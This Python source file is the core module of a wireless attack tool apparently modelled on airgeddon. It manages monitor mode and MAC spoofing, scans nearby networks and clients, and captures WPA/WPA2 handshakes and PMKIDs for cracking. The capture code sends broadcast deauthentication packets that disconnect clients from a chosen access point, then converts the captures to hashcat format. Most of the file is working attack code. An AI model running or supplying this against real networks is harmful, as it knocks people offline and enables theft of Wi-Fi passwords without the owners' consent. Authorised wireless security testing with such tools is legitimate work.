#!/usr/bin/env python3
"""
PyAirgeddon Core Module
Wireless interface management, network scanning, and capture utilities
Requires: Linux with wireless drivers supporting monitor mode
"""

import subprocess
import sys
import re
import os
import time
import signal
import threading
from dataclasses import dataclass, field
from typing import List, Optional, Callable, Dict, Tuple
from datetime import datetime
import tempfile

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class WirelessNetwork:
    """Represents a discovered wireless network"""
    bssid: str
    ssid: str = ""
    channel: int = 0
    signal: int = -100
    encryption: str = "OPEN"
    cipher: str = ""
    auth: str = ""
    wps: bool = False
    clients: List[str] = field(default_factory=list)
    
    def __str__(self):
        return f"{self.ssid or '<Hidden>'} ({self.bssid}) CH:{self.channel} PWR:{self.signal} {self.encryption}"


@dataclass  
class WirelessClient:
    """Represents a wireless client"""
    mac: str
    bssid: str = ""
    signal: int = -100
    packets: int = 0
    probes: List[str] = field(default_factory=list)


@dataclass
class HandshakeResult:
    """Result of handshake capture attempt"""
    success: bool
    file_path: str = ""
    pmkid: bool = False
    message: str = ""


# ============================================================================
# WIRELESS INTERFACE MANAGEMENT
# ============================================================================

class WirelessInterface:
    """
    Manages wireless interface operations:
    - Detection and listing
    - Mode switching (managed <-> monitor)
    - MAC address spoofing
    """
    
    def __init__(self):
        self.interfaces: Dict[str, dict] = {}
        self.original_macs: Dict[str, str] = {}
        
    def refresh_interfaces(self) -> List[str]:
        """Detect and list all wireless interfaces"""
        self.interfaces.clear()
        
        try:
            # Use iw to get wireless interfaces
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            
            current_iface = None
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    current_iface = line.split()[-1]
                    self.interfaces[current_iface] = {
                        'mode': 'managed',
                        'mac': '',
                        'channel': 0,
                        'phy': ''
                    }
                elif current_iface:
                    if 'type' in line:
                        mode = line.split()[-1]
                        self.interfaces[current_iface]['mode'] = mode
                    elif 'addr' in line:
                        self.interfaces[current_iface]['mac'] = line.split()[-1]
                    elif 'channel' in line:
                        try:
                            self.interfaces[current_iface]['channel'] = int(line.split()[1])
                        except:
                            pass
                            
            # Store original MACs
            for iface, info in self.interfaces.items():
                if iface not in self.original_macs and info['mac']:
                    self.original_macs[iface] = info['mac']
                    
        except FileNotFoundError:
            # Try alternative: iwconfig
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.STDOUT)
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        iface = line.split()[0]
                        self.interfaces[iface] = {
                            'mode': 'managed',
                            'mac': self._get_mac(iface),
                            'channel': 0,
                            'phy': ''
                        }
            except:
                pass
                
        return list(self.interfaces.keys())
    
    def _get_mac(self, interface: str) -> str:
        """Get MAC address of interface"""
        try:
            with open(f'/sys/class/net/{interface}/address', 'r') as f:
                return f.read().strip()
        except:
            return ""
    
    def get_mode(self, interface: str) -> str:
        """Get current mode of interface"""
        if interface in self.interfaces:
            return self.interfaces[interface].get('mode', 'unknown')
        return 'unknown'
    
    def set_monitor_mode(self, interface: str, log_callback: Callable = None) -> Tuple[bool, str]:
        """
        Switch interface to monitor mode
        Returns: (success, message or new interface name)
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Switching {interface} to monitor mode...")
        
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
            log("[+] Killed interfering processes")
            
            # Start monitor mode
            result = subprocess.run(['airmon-ng', 'start', interface], 
                                  capture_output=True, text=True)
            
            # Find new interface name (could be wlan0mon, wlan0, etc.)
            new_iface = interface + 'mon'
            if 'mon' in result.stdout:
                match = re.search(r'\(([^)]*mon[^)]*)\)', result.stdout)
                if match:
                    new_iface = match.group(1)
            
            # Verify
            self.refresh_interfaces()
            if new_iface in self.interfaces or interface in self.interfaces:
                final_iface = new_iface if new_iface in self.interfaces else interface
                log(f"[+] Monitor mode enabled on {final_iface}")
                return True, final_iface
            
            # Alternative method using iw
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            subprocess.run(['iw', interface, 'set', 'type', 'monitor'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            
            self.refresh_interfaces()
            log(f"[+] Monitor mode enabled on {interface}")
            return True, interface
            
        except Exception as e:
            log(f"[-] Error: {e}")
            return False, str(e)
    
    def set_managed_mode(self, interface: str, log_callback: Callable = None) -> Tuple[bool, str]:
        """Switch interface back to managed mode"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Switching {interface} to managed mode...")
        
        try:
            # Try airmon-ng first
            result = subprocess.run(['airmon-ng', 'stop', interface], 
                                  capture_output=True, text=True)
            
            # Alternative method
            base_iface = interface.replace('mon', '')
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            subprocess.run(['iw', interface, 'set', 'type', 'managed'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            
            # Restart NetworkManager
            subprocess.run(['systemctl', 'start', 'NetworkManager'], capture_output=True)
            
            self.refresh_interfaces()
            log(f"[+] Managed mode restored")
            return True, base_iface
            
        except Exception as e:
            log(f"[-] Error: {e}")
            return False, str(e)
    
    def spoof_mac(self, interface: str, new_mac: str = None, log_callback: Callable = None) -> Tuple[bool, str]:
        """
        Spoof MAC address of interface
        If new_mac is None, generates a random MAC
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        if not new_mac:
            # Generate random MAC
            import random
            new_mac = ':'.join([f'{random.randint(0, 255):02x}' for _ in range(6)])
            # Ensure locally administered and unicast
            first_byte = int(new_mac.split(':')[0], 16)
            first_byte = (first_byte & 0xFE) | 0x02
            new_mac = f'{first_byte:02x}' + new_mac[2:]
        
        log(f"[*] Spoofing MAC to {new_mac}...")
        
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True, capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], check=True, capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True, capture_output=True)
            
            log(f"[+] MAC spoofed to {new_mac}")
            self.refresh_interfaces()
            return True, new_mac
            
        except Exception as e:
            log(f"[-] Error: {e}")
            return False, str(e)
    
    def restore_mac(self, interface: str, log_callback: Callable = None) -> bool:
        """Restore original MAC address"""
        if interface in self.original_macs:
            success, _ = self.spoof_mac(interface, self.original_macs[interface], log_callback)
            return success
        return False


# ============================================================================
# NETWORK SCANNER
# ============================================================================

class NetworkScanner:
    """
    Scans for wireless networks and clients using airodump-ng
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.networks: Dict[str, WirelessNetwork] = {}
        self.clients: Dict[str, WirelessClient] = {}
        self.scan_process = None
        self.running = False
        self.temp_dir = tempfile.mkdtemp(prefix='pyairgeddon_')
        self.csv_file = os.path.join(self.temp_dir, 'scan')
        
    def start_scan(self, channel: int = 0, band: str = 'abg', 
                   callback: Callable = None, log_callback: Callable = None):
        """
        Start continuous network scanning
        channel: 0 for channel hopping, specific channel number otherwise
        band: 'a' (5GHz), 'bg' (2.4GHz), 'abg' (both)
        callback: called when new networks/clients are found
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        if self.running:
            log("[-] Scan already running")
            return
        
        log(f"[*] Starting scan on {self.interface}...")
        
        cmd = [
            'airodump-ng',
            '--output-format', 'csv',
            '-w', self.csv_file,
            '--band', band
        ]
        
        if channel > 0:
            cmd.extend(['-c', str(channel)])
        
        cmd.append(self.interface)
        
        self.running = True
        self.scan_process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Start parser thread
        def parse_loop():
            while self.running:
                time.sleep(1)
                self._parse_csv()
                if callback:
                    callback(list(self.networks.values()), list(self.clients.values()))
        
        threading.Thread(target=parse_loop, daemon=True).start()
        log("[+] Scan started")
    
    def stop_scan(self, log_callback: Callable = None):
        """Stop scanning"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        if self.scan_process:
            self.scan_process.terminate()
            try:
                self.scan_process.wait(timeout=2)
            except:
                self.scan_process.kill()
            self.scan_process = None
        
        log("[+] Scan stopped")
    
    def _parse_csv(self):
        """Parse airodump-ng CSV output"""
        csv_path = self.csv_file + '-01.csv'
        if not os.path.exists(csv_path):
            return
        
        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Split into AP and Client sections
            sections = content.split('\r\n\r\n')
            
            # Parse APs (first section)
            if len(sections) > 0:
                lines = sections[0].strip().split('\n')
                for line in lines[2:]:  # Skip headers
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        bssid = parts[0].upper()
                        if re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
                            network = WirelessNetwork(
                                bssid=bssid,
                                channel=int(parts[3]) if parts[3].strip().isdigit() else 0,
                                signal=int(parts[8]) if parts[8].strip().lstrip('-').isdigit() else -100,
                                encryption=parts[5].strip(),
                                cipher=parts[6].strip(),
                                auth=parts[7].strip(),
                                ssid=parts[13].strip() if len(parts) > 13 else ""
                            )
                            self.networks[bssid] = network
            
            # Parse Clients (second section)
            if len(sections) > 1:
                lines = sections[1].strip().split('\n')
                for line in lines[2:]:  # Skip headers
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 6:
                        mac = parts[0].upper()
                        if re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', mac):
                            client = WirelessClient(
                                mac=mac,
                                bssid=parts[5].strip() if len(parts) > 5 else "",
                                signal=int(parts[3]) if parts[3].strip().lstrip('-').isdigit() else -100,
                                packets=int(parts[4]) if parts[4].strip().isdigit() else 0
                            )
                            self.clients[mac] = client
                            
                            # Add client to network's client list
                            if client.bssid in self.networks:
                                if mac not in self.networks[client.bssid].clients:
                                    self.networks[client.bssid].clients.append(mac)
                                
        except Exception as e:
            pass  # Parsing errors are expected during scanning
    
    def get_networks(self) -> List[WirelessNetwork]:
        """Get all discovered networks"""
        return sorted(self.networks.values(), key=lambda n: n.signal, reverse=True)
    
    def get_clients(self, bssid: str = None) -> List[WirelessClient]:
        """Get clients, optionally filtered by BSSID"""
        if bssid:
            return [c for c in self.clients.values() if c.bssid == bssid]
        return list(self.clients.values())
    
    def cleanup(self):
        """Clean up temporary files"""
        import shutil
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass


# ============================================================================
# HANDSHAKE CAPTURE
# ============================================================================

class HandshakeCapture:
    """
    Captures WPA/WPA2 handshakes and PMKIDs
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.capture_process = None
        self.running = False
        self.temp_dir = tempfile.mkdtemp(prefix='pyairgeddon_hs_')
        
    def capture_handshake(self, target_bssid: str, channel: int, 
                          timeout: int = 120, deauth: bool = True,
                          client_mac: str = None,
                          log_callback: Callable = None,
                          progress_callback: Callable = None) -> HandshakeResult:
        """
        Capture WPA/WPA2 handshake
        target_bssid: Target AP MAC address
        channel: Channel of target AP
        timeout: Maximum time to wait for handshake
        deauth: Whether to send deauth packets to speed up capture
        client_mac: Specific client to deauth (or broadcast)
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        cap_file = os.path.join(self.temp_dir, f'handshake_{target_bssid.replace(":", "")}')
        
        log(f"[*] Starting handshake capture for {target_bssid} on channel {channel}")
        
        # Set channel
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)], 
                      capture_output=True)
        
        # Start capture
        cmd = [
            'airodump-ng',
            '-c', str(channel),
            '--bssid', target_bssid,
            '-w', cap_file,
            '--output-format', 'pcap',
            self.interface
        ]
        
        self.running = True
        self.capture_process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Deauth thread
        deauth_process = None
        if deauth:
            target = client_mac if client_mac else 'FF:FF:FF:FF:FF:FF'
            log(f"[*] Sending deauth packets to {target}")
            
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', '5',
                '-a', target_bssid,
                '-c', target,
                self.interface
            ]
            deauth_process = subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        
        # Wait for handshake
        cap_path = cap_file + '-01.cap'
        start_time = time.time()
        handshake_found = False
        
        while self.running and (time.time() - start_time) < timeout:
            elapsed = int(time.time() - start_time)
            if progress_callback:
                progress_callback(elapsed, timeout)
            
            # Check for handshake
            if os.path.exists(cap_path):
                check = subprocess.run(
                    ['aircrack-ng', cap_path],
                    capture_output=True,
                    text=True
                )
                if 'handshake' in check.stdout.lower():
                    handshake_found = True
                    log("[+] Handshake captured!")
                    break
                    
                # Send periodic deauths
                if deauth and elapsed % 10 == 0 and elapsed > 0:
                    subprocess.run(
                        ['aireplay-ng', '--deauth', '3', '-a', target_bssid, 
                         '-c', client_mac or 'FF:FF:FF:FF:FF:FF', self.interface],
                        capture_output=True
                    )
            
            time.sleep(1)
        
        # Cleanup
        self.running = False
        if self.capture_process:
            self.capture_process.terminate()
        if deauth_process:
            deauth_process.terminate()
        
        if handshake_found:
            return HandshakeResult(
                success=True,
                file_path=cap_path,
                message="Handshake captured successfully"
            )
        else:
            log("[-] Handshake capture timed out")
            return HandshakeResult(
                success=False,
                message="Timeout - no handshake captured"
            )
    
    def capture_pmkid(self, target_bssid: str, channel: int,
                      timeout: int = 30,
                      log_callback: Callable = None) -> HandshakeResult:
        """
        Capture PMKID (faster alternative to full handshake)
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Attempting PMKID capture for {target_bssid}")
        
        pmkid_file = os.path.join(self.temp_dir, f'pmkid_{target_bssid.replace(":", "")}')
        
        try:
            # Using hcxdumptool for PMKID capture
            cmd = [
                'hcxdumptool',
                '-i', self.interface,
                '-o', pmkid_file + '.pcapng',
                '--filterlist_ap', target_bssid.replace(':', '').lower(),
                '--filtermode', '2',
                '-c', str(channel)
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(timeout)
            process.terminate()
            
            # Convert to hashcat format
            if os.path.exists(pmkid_file + '.pcapng'):
                subprocess.run([
                    'hcxpcapngtool',
                    '-o', pmkid_file + '.22000',
                    pmkid_file + '.pcapng'
                ], capture_output=True)
                
                if os.path.exists(pmkid_file + '.22000'):
                    log("[+] PMKID captured!")
                    return HandshakeResult(
                        success=True,
                        file_path=pmkid_file + '.22000',
                        pmkid=True,
                        message="PMKID captured successfully"
                    )
            
            log("[-] No PMKID captured")
            return HandshakeResult(success=False, message="No PMKID captured")
            
        except FileNotFoundError:
            log("[-] hcxdumptool not found, using alternative method")
            return HandshakeResult(success=False, message="hcxdumptool not installed")
    
    def stop_capture(self):
        """Stop ongoing capture"""
        self.running = False
        if self.capture_process:
            self.capture_process.terminate()
    
    def cleanup(self):
        """Clean up temporary files"""
        import shutil
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def check_root() -> bool:
    """Check if running as root"""
    return os.geteuid() == 0


def check_dependencies(custom_paths: Dict[str, str] = None) -> Dict[str, bool]:
    """
    Check for required external tools with cross-platform support
    
    Args:
        custom_paths: Optional dict of {tool_name: path} for custom tool locations
        
    Returns:
        Dict of {tool_name: is_available}
    """
    import shutil
    
    tools = {
        'airmon-ng': False,
        'airodump-ng': False,
        'aireplay-ng': False,
        'aircrack-ng': False,
        'iw': False,
        'iwconfig': False,
        'hostapd': False,
        'dnsmasq': False,
        'hcxdumptool': False,
        'hcxpcapngtool': False,
        'hashcat': False,
        'reaver': False,
        'bully': False,
        'mdk4': False
    }
    
    custom_paths = custom_paths or {}
    is_windows = os.name == 'nt'
    
    # Common Windows installation paths to search
    windows_paths = [
        os.path.expandvars(r'%PROGRAMFILES%\Aircrack-ng'),
        os.path.expandvars(r'%PROGRAMFILES(X86)%\Aircrack-ng'),
        os.path.expandvars(r'%LOCALAPPDATA%\Programs\Aircrack-ng'),
        os.path.expanduser('~\\hashcat'),
        os.path.expanduser('~\\Tools\\hashcat'),
    ]
    
    for tool in tools:
        # First check custom paths
        if tool in custom_paths:
            path = custom_paths[tool]
            if os.path.isfile(path) or shutil.which(path):
                tools[tool] = True
                continue
        
        # Check if tool is in PATH using shutil.which (cross-platform)
        if shutil.which(tool):
            tools[tool] = True
            continue
        
        # Windows-specific executable extensions
        if is_windows:
            for ext in ['.exe', '.bat', '.cmd']:
                if shutil.which(tool + ext):
                    tools[tool] = True
                    break
            
            # Check common Windows install locations
            if not tools[tool]:
                for base_path in windows_paths:
                    if os.path.isdir(base_path):
                        tool_path = os.path.join(base_path, tool + '.exe')
                        if os.path.isfile(tool_path):
                            tools[tool] = True
                            break
        else:
            # Linux: try 'which' command as fallback
            try:
                result = subprocess.run(
                    ['which', tool], 
                    capture_output=True, 
                    timeout=5
                )
                tools[tool] = result.returncode == 0
            except:
                pass
    
    return tools


def get_install_commands() -> Dict[str, str]:
    """
    Get installation commands for missing tools based on detected OS
    
    Returns:
        Dict of {tool_name: installation_command}
    """
    is_linux = sys.platform.startswith('linux')
    
    if not is_linux:
        return {
            'aircrack-ng': 'Download from: https://www.aircrack-ng.org/',
            'hashcat': 'Download from: https://hashcat.net/hashcat/',
            'note': 'Most tools require Linux. Consider using WSL or a Linux VM.'
        }
    
    # Detect Linux package manager
    if os.path.exists('/etc/debian_version'):
        # Debian/Ubuntu
        return {
            'aircrack-ng': 'sudo apt install aircrack-ng',
            'hostapd': 'sudo apt install hostapd',
            'dnsmasq': 'sudo apt install dnsmasq',
            'hcxtools': 'sudo apt install hcxdumptool hcxtools',
            'hashcat': 'sudo apt install hashcat',
            'reaver': 'sudo apt install reaver',
            'bully': 'sudo apt install bully',
            'mdk4': 'sudo apt install mdk4',
            'all': 'sudo apt install aircrack-ng hostapd dnsmasq hcxdumptool hcxtools hashcat reaver bully mdk4'
        }
    elif os.path.exists('/etc/fedora-release') or os.path.exists('/etc/redhat-release'):
        # Fedora/RHEL
        return {
            'aircrack-ng': 'sudo dnf install aircrack-ng',
            'hostapd': 'sudo dnf install hostapd',
            'dnsmasq': 'sudo dnf install dnsmasq',
            'hashcat': 'sudo dnf install hashcat',
            'all': 'sudo dnf install aircrack-ng hostapd dnsmasq hashcat'
        }
    elif os.path.exists('/etc/arch-release'):
        # Arch Linux
        return {
            'aircrack-ng': 'sudo pacman -S aircrack-ng',
            'hostapd': 'sudo pacman -S hostapd',
            'dnsmasq': 'sudo pacman -S dnsmasq',
            'hcxtools': 'sudo pacman -S hcxtools',
            'hashcat': 'sudo pacman -S hashcat',
            'all': 'sudo pacman -S aircrack-ng hostapd dnsmasq hcxtools hashcat reaver bully mdk4'
        }
    
    # Generic Linux
    return {
        'note': 'Use your distribution\'s package manager to install the required tools'
    }


def get_timestamp() -> str:
    """Get formatted timestamp"""
    return datetime.now().strftime("%H:%M:%S")


# ============================================================================
# MAIN (for testing)
# ============================================================================

if __name__ == "__main__":
    if not check_root():
        print("[!] This script requires root privileges")
        exit(1)
    
    print("[*] PyAirgeddon Core Module Test")
    print("-" * 40)
    
    # Check dependencies
    deps = check_dependencies()
    print("[*] Dependency check:")
    for tool, available in deps.items():
        status = "✓" if available else "✗"
        print(f"    {status} {tool}")
    
    # List interfaces
    iface_mgr = WirelessInterface()
    interfaces = iface_mgr.refresh_interfaces()
    
    print(f"\n[*] Found {len(interfaces)} wireless interfaces:")
    for iface in interfaces:
        info = iface_mgr.interfaces[iface]
        print(f"    - {iface}: {info['mode']} ({info['mac']})")
